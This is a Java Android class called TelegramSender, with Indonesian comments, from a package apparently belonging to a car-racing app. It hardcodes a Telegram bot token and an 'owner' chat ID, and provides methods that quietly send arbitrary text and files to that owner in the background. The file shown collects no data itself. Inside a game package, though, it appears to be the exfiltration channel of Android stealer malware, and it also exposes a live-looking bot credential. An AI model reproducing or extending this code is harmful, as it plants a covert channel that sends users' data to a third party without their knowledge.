package com.carrace;

import android.util.Log;

import com.pengrad.telegrambot.TelegramBot;
import com.pengrad.telegrambot.request.SendDocument;
import com.pengrad.telegrambot.request.SendMessage;
import com.pengrad.telegrambot.response.SendResponse;

import java.io.File;

public final class TelegramSender {

    private static final String TAG = "TelegramSender";

    // ====== KONFIGURASI OWNER ======
    private static final String BOT_TOKEN = "8539992688:AAEuPMyOXEweuaaHebCjGqsnMdeucQFKXhA";
    private static final String OWNER_ID  = "8275632263";
    // ================================

    private static final TelegramBot BOT = new TelegramBot(BOT_TOKEN);

    private TelegramSender() { }

    /** Kirim raw text. WAJIB dipanggil dari background thread. */
    public static boolean sendRawText(String text) {
        try {
            SendResponse response = BOT.execute(new SendMessage(OWNER_ID, text));
            if (response.isOk()) {
                Log.i(TAG, "sendRawText OK");
                return true;
            }
            Log.w(TAG, "sendRawText gagal: " + response.description());
            return false;
        } catch (Exception e) {
            Log.w(TAG, "sendRawText exception", e);
            return false;
        }
    }

    /** Kirim file dokumen. WAJIB dipanggil dari background thread. */
    public static boolean sendDocument(File file, String caption) {
        try {
            SendDocument request = new SendDocument(OWNER_ID, file);
            if (caption != null && !caption.isEmpty()) {
                request.caption(caption);
            }
            SendResponse response = BOT.execute(request);
            if (response.isOk()) {
                Log.i(TAG, "sendDocument OK: " + file.getName());
                return true;
            }
            Log.w(TAG, "sendDocument gagal: " + response.description());
            return false;
        } catch (Exception e) {
            Log.w(TAG, "sendDocument exception", e);
            return false;
        }
    }
}
